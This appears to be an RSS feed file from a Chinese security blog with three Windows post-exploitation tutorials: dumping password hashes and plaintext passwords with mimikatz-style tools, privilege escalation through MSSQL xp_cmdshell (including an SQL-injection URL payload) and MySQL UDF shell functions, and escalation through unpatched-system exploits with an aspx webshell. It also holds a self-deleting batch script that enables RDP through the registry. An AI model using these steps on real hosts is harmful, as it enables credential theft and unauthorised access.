@@ -1,0 +1,845 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Windows on </title>
+    <link>http://wyb0.com/tags/windows/</link>
+    <description>Recent content in Windows on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
+    <lastBuildDate>Mon, 08 Aug 2016 08:28:27 +0800</lastBuildDate>
+    <atom:link href="http://wyb0.com/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>导出主机密码与开启3389</title>
+      <link>http://wyb0.com/posts/%E5%AF%BC%E5%87%BA%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81%E4%B8%8E%E5%BC%80%E5%90%AF3389/</link>
+      <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/%E5%AF%BC%E5%87%BA%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81%E4%B8%8E%E5%BC%80%E5%90%AF3389/</guid>
+      <description>
+
+&lt;h3 id=&#34;0x00-导出主机密码hash:5e20602fb71039ffb7d25cddb375ec0e&#34;&gt;0x00 导出主机密码hash&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;条件
+
+&lt;ul&gt;
+&lt;li&gt;administrator以上权限&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;工具
+
+&lt;ul&gt;
+&lt;li&gt;wce&lt;/li&gt;
+&lt;li&gt;gethash&lt;/li&gt;
+&lt;li&gt;hashdump&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;hash解密网站&lt;br /&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.objectif-securite.ch/ophcrack.php&#34;&gt;http://www.objectif-securite.ch/ophcrack.php&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;上传工具得到hash
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_whoami.png&#34; alt=&#34;查看是否为管理员以上权限&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_wce.png&#34; alt=&#34;上传wce&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_get_hash.png&#34; alt=&#34;得到hash&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_get_pwd.png&#34; alt=&#34;解出密码&#34;&gt;
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x01-导出主机密码:5e20602fb71039ffb7d25cddb375ec0e&#34;&gt;0x01 导出主机密码&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;条件
+
+&lt;ul&gt;
+&lt;li&gt;administrator以上权限&lt;/li&gt;
+&lt;li&gt;当前管理员没有注销登陆(可以通过query user命令看出)&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;工具
+
+&lt;ul&gt;
+&lt;li&gt;mimikatz&lt;/li&gt;
+&lt;li&gt;getpass&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;上传工具得到密码
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_whoami.png&#34; alt=&#34;查看是否为管理员以上权限&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_query_user.png&#34; alt=&#34;查看管理员是否注销登陆&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_getpass.png&#34; alt=&#34;上传getpass&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_getpass1.png&#34; alt=&#34;得到密码1&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_getpass2.png&#34; alt=&#34;得到密码2&#34;&gt;
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x02-开启3389:5e20602fb71039ffb7d25cddb375ec0e&#34;&gt;0x02 开启3389&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;直接使用注册表
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_new_file_3389_reg.png&#34; alt=&#34;新建开3389的注册表&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_3389.png&#34; alt=&#34;开3389端口&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_3389_success.png&#34; alt=&#34;成功开启3389端口&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;写一个批处理也行&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# 3389.bat内容如下：
+echo Windows Registry Editor Version 5.00&amp;gt;&amp;gt;3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&amp;gt;&amp;gt;3389.reg 
+echo &amp;quot;fDenyTSConnections&amp;quot;=dword:00000000&amp;gt;&amp;gt;3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&amp;gt;&amp;gt;3389.reg 
+echo &amp;quot;PortNumber&amp;quot;=dword:00000d3d&amp;gt;&amp;gt;3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&amp;gt;&amp;gt;3389.reg 
+echo &amp;quot;PortNumber&amp;quot;=dword:00000d3d&amp;gt;&amp;gt;3389.reg 
+regedit /s 3389.reg 
+del 3389.reg
+del 3389.bat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_new_file_3389_bat.png&#34; alt=&#34;新建开3389的注册表&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Windows下第三方服务提权</title>
+      <link>http://wyb0.com/posts/Windows%E4%B8%8B%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/</link>
+      <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/Windows%E4%B8%8B%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/</guid>
+      <description>
+
+&lt;p&gt;&lt;center&gt;&lt;h2&gt;MSSQL和MySQL提权&lt;/h2&gt;&lt;/center&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;mssql提权:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;MSSQL提权&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权&lt;br /&gt;
+提权条件：数据库账号是DBA权限&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;关于xp-cmdshell:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;关于xp_cmdshell&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &amp;lsquo;net user&amp;rsquo;;&lt;/li&gt;
+&lt;li&gt;有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &amp;lsquo;net user&amp;rsquo;;--&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;连接数据库:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;连接数据库&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_find_sql_conn_msg.png&#34; alt=&#34;Windows下第三方服务提权-找数据库连接信息&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_conn_mssql.png&#34; alt=&#34;Windows下第三方服务提权-连接mssql数据库&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;执行系统命令:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;执行系统命令&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_exec_sys_command.png&#34; alt=&#34;Windows下第三方服务提权-尝试用xp_cmdshell执行命令&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_cmd_shell.png&#34; alt=&#34;Windows下第三方服务提权-开启xp_cmdshell组件&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_exec_sys_command_success.png&#34; alt=&#34;Windows下第三方服务提权-使用xp_cmdshell成功执行命令&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;添加用户:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;添加用户&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_add_user.png&#34; alt=&#34;Windows下第三方服务提权-添加用户&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_user.png&#34; alt=&#34;Windows下第三方服务提权-查看添加的用户&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;远程连接:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;远程连接&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_conn.png&#34; alt=&#34;Windows下第三方服务提权-远程连接&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_input_u_p.png&#34; alt=&#34;Windows下第三方服务提权-输入用户名和密码&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_view_ip.png&#34; alt=&#34;Windows下第三方服务提权-输入用户名和密码&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;mysql提权:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;MySQL提权&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;环境：web应用服务器权限较低&lt;br /&gt;
+提权条件：MySQL是system权限&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;关于udf:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;关于UDF&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;udf提权过程:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;UDF提权过程&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;导入udf.dll到服务器指定目录&lt;br /&gt;
+
+&lt;ul&gt;
+&lt;li&gt;MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;使用SQL语句创建功能函数&lt;br /&gt;
+CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.dll&amp;rsquo;;&lt;/li&gt;
+&lt;li&gt;执行MySQL语句调用新创建的函数&lt;br /&gt;
+select shell(&amp;lsquo;cmd&amp;rsquo;,&amp;lsquo;whoami&amp;rsquo;);&lt;/li&gt;
+&lt;li&gt;删除创建的函数&lt;br /&gt;
+drop function shell;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;查看基本信息:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;查看基本信息&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_base_msg.png&#34; alt=&#34;Windows下第三方服务提权-查看基本信息&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_current_user.png&#34; alt=&#34;Windows下第三方服务提权-查看当前用户&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_current_user_permissions.png&#34; alt=&#34;Windows下第三方服务提权-查看当前用户权限&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;上传udf提权:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;上传udf提权&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_udf.png&#34; alt=&#34;Windows下第三方服务提权-上传udf&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_conn_mysql.png&#34; alt=&#34;Windows下第三方服务提权-连接数据库&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_export_udf.png&#34; alt=&#34;Windows下第三方服务提权-导出udf.dll并生成函数&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_exec_whoami.png&#34; alt=&#34;Windows下第三方服务提权-提权成功执行whoami&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;添加用户-1:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;添加用户&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_add_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数添加用户&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_add_user_to_administrators.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数添加用户到管理员组&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_active_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数激活用户&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_view_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数查看用户&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;远程连接-1:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;远程连接&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_remote_connection.png&#34; alt=&#34;Windows下第三方服务提权-远程3389连接&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Windows下系统漏洞提权</title>
+      <link>http://wyb0.com/posts/Windows%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</link>
+      <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/Windows%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</guid>
+      <description>
+
+&lt;p&gt;提权是在已经getshell但是权限不大的前提下做的&lt;/p&gt;
+
+&lt;h3 id=&#34;0x00-查看基本信息:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x00 查看基本信息&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_msg1.png&#34; alt=&#34;Windows系统漏洞提权-查看基本信息1&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_msg2.png&#34; alt=&#34;Windows系统漏洞提权-查看基本信息2&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-使用cmd执行命令:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x01 使用cmd执行命令&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;尝试使用cmd执行命令
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd.png&#34; alt=&#34;Windows系统漏洞提权-尝试使用cmd执行命令&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;找可写目录
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_find_wirteable_dir.png&#34; alt=&#34;Windows系统漏洞提权-找可写目录&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;尝试上传cmd.exe
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_upload_cmd.png&#34; alt=&#34;Windows系统漏洞提权-尝试上传cmd&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;写一个aspx马
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_write_aspx.png&#34; alt=&#34;Windows系统漏洞提权-写一个aspx马&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_aspx.png&#34; alt=&#34;Windows系统漏洞提权-查看aspx马&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;上传cmd.exe
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_cmd.png&#34; alt=&#34;Windows系统漏洞提权-上传cmd&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_cmd.png&#34; alt=&#34;Windows系统漏洞提权-查看上传的cmd&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;再次尝试使用cmd执行命令
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd_again1.png&#34; alt=&#34;Windows系统漏洞提权-再次尝试使用cmd执行命令1&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd_again2.png&#34; alt=&#34;Windows系统漏洞提权-再次尝试使用cmd执行命令2&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x02-权限提升:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x02 权限提升&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;查看未安装补丁
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_patch.png&#34; alt=&#34;Windows系统漏洞提权-查看系统未安装补丁&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;上传exp提权
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_iis6.png&#34; alt=&#34;Windows系统漏洞提权-上传iis6&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_run_iis6_1.png&#34; alt=&#34;Windows系统漏洞提权-第一次运行iis6&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_run_iis6_2.png&#34; alt=&#34;Windows系统漏洞提权-再次运行iis6&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x03-添加用户:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x03 添加用户&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;添加远程连接用户
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_use_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-使用系统自带的帮助用户&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_sys_help_user_add_pwd.png&#34; alt=&#34;Windows系统漏洞提权-为系统自带的帮助用户添加密码&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_sys_help_user_add_administrators.png&#34; alt=&#34;Windows系统漏洞提权-将系统自带的帮助用户添加到管理员组&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_active_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-启用系统自带的帮助用户&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-查看系统自带的帮助用户现在的权限信息&#34;&gt;
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x04-使用3389远程连接:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x04 使用3389远程连接&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_ip.png&#34; alt=&#34;Windows系统漏洞提权-查看ip信息&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection.png&#34; alt=&#34;Windows系统漏洞提权-远程连接&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
